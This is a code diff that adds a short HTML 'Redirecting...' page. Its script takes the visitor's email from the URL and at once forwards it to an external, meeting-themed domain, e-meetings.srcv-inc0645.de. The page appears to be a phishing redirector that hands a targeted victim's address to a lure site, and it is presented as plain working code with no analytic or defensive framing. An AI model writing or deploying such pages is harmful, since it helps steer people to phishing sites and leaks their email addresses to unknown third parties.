@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Redirecting...</title>
+  <script>
+    // Extract the 'email' parameter from the current URL
+    const params = new URLSearchParams(window.location.search);
+    const email = params.get("email");
+
+    if (email) {
+      // Redirect to the actual target with the email encoded properly
+      const target = `https://e-meetings.srcv-inc0645.de/u?email=${encodeURIComponent(email)}`;
+      window.location.replace(target);
+    } else {
+      // If no email provided, show error or fallback
+      document.addEventListener("DOMContentLoaded", function () {
+        document.body.innerHTML = "<p>Error: No email parameter found.</p>";
+      });
+    }
+  </script>
+</head>
+<body>
+  <p>Redirecting... If not, <a href="#">click here</a>.</p>
+</body>
+</html>
